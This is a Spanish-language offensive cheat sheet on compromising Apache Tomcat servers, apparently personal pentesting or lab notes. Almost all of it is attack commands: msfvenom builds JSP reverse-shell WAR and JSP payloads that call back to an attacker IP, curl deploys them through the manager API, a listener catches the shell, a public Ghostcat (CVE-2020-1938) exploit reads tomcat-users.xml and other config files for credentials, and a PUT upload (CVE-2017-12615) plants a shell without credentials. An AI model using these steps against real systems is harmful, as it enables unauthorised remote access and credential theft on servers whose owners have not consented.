# Tomcat 

Tags: #Tomcat #Linux 

## Ruta en la web

```bash 
/manager/html            # Ruta típica que contiene un panel de autenticación en donde se encuentra el panel de admin en Tomcat 
/host-manager/html       # Ruta alternativa 

/manager/status/         # Muestra la versión de Tomcat         
```
## Crear una aplicación para subirla desde el panel Tomcat  

```bash 
# En el panel de manager, encontramos una opción en donde podemos subir un archivo .war, por lo que hacemos lo siguiente:

❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f war -o shell.war # Creamos nuestro archivo malicioso .war 

	# p = Payload
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port 'Atacante'
	# f = Formato war
	# o = Exportar como 'shell.war'
```

## CVE-2020-1938 - "Ghoscat"
* [Apache Tomcat - AJP (Ghostcat File Read/Inclusion)](https://www.exploit-db.com/exploits/48143)
```bash 
# condiciones 
	- Apache Tomcat versión 9.0.30
	- Puerto 8009 expuesto y accesible (Apache Jserv (Protocol v1.3))

Paso 1: 
❯ git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487 && cd Ghostcat-CNVD-2020-10487

Paso 2: Extraer credenciales 
❯ python3 ajpShooter.py http://IP 8009 /WEB-INF/web.xml read

# Credenciales de Tomcat
❯ python3 ajpShooter.py http://IP 8009 /WEB-INF/tomcat-users.xml read

# Configuración general
❯ python3 ajpShooter.py http://IP 8009 /META-INF/context.xml read
```

```bash 
Paso 3: Subir un archivo malicioso para obtener una revershell o si esta expuesto el SSH ingresar al server 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=4444 -f war -o shell.war

❯ curl -u 'usuario:password' -T shell.war http://IP:8080/manager/text/deploy?path=/shell

Paso 4:
❯ penelope -p 4444  # En escucha para recibir la revershell

Paso 5: 
❯ curl http://IP:8080/shell/
```

### Subir una aplicación desde la consola con credenciales válidas de 'admin'

```bash 
Paso 1: Crear la aplicación von revershell 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=4444 -f war -o shell.war

Paso 2: 
❯ curl -s -u 'username:passwd' -X GET "http://IP:8080/manager/text/list"    
# Listar aplicaciones existentes en Tomcat 

❯ curl -s -u 'username:passwd' "http://IP:8080/manager/text/deploy?path=/shell" --upload-file shell.war  
# Desplegar la aplicacion creada anteriormente 

❯ curl http://IP:8080/shell/   
# Ejecutar la aplicación 
```

## Subir una aplicación sin credenciales CVE-2017-12615

```bash 
# Utilizando el Tomcat < 9.0.1 (beta) < 8.5.23 

1. Crear el archivo malicioso con 'Msfvenom'

❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o shell.jsp # Creamos nuestro archivo malicioso .jsp
	
2. Capturar con Burpsuite la peticion del puerto 8080
3. Colocar en la cabecera 'PUT /shell.jsp' para cargar el archivo antes creado en el Tomcat
4. Mandar la peticion 

Nota: Si al momento de cargar el archivo por la web para obtener la revershell nos muestra el contenido del archivo. Agregar ese contenido al 'Body' de nuestra peticion en Burpsuite y al momento de volverlo a mandar, ahora si nos dara la Revershell. 
```